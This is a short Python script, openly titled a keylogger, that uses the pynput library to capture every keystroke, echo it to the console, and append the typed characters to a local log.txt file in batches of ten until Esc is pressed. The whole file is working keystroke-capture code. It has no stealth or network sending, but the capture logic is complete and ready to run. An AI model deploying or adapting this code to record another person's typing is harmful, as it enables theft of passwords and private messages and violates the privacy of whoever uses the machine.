# Python Keylogger
# Once running, creates new log.txt file and writes output of 
# strings to the file after ever 10 characters are typed.
# Stops running when the esc button is pressed.

import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def clicked(key):
  global keys, count
  keys.append(key)
  count += 1
  print("{0} pressed".format(key))

  if count >= 10:
    count = 0
    write_file(keys)
    keys = []

def write_file(keys):
  with open("log.txt", "a") as f:
    for key in keys:
      k = str(key).replace("'", "")
      if k.find("space") > 0:
        f.write("\n")
      
      elif k.find("Key") == -1:
        f.write(k)

def released(key):
  if key == Key.esc:
    return False

with Listener(on_press=clicked, on_release=released) as listener:
  listener.join()
